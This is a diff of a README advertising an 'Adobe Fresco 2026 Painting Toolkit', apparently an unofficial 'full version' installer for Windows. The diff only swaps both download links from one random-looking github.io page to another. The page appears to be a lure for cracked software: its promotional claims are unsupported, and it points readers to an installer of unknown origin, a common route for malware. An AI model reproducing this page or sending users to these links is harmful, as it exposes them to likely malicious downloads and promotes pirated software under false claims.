@@ -2,7 +2,7 @@
 
 Welcome to the Adobe Fresco 2026 Painting Toolkit — the ultimate all-in-one desktop solution for unlocking the full creative power of Adobe Fresco on Windows. This comprehensive package delivers premium brush collections, vector tool enhancements, painting assets, and a built-in plugin manager so you can produce professional-grade digital artwork without compromise. If you have been searching for the fresco full version experience on desktop, this toolkit brings every feature together in one seamless Windows 10/11 installer, updated for 2026.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## What's Included
 
@@ -70,7 +70,7 @@ A: Absolutely. The toolkit installs as a separate application and can be removed
 
 Ready to get started? Grab the latest release from our official download page:
 
-[Download the latest version from GitHub](https://yellowtaxisave.github.io/download-page/)
+[Download the latest version from GitHub](https://capitals-707-bringing.github.io/download-page/)
 
 ---
 
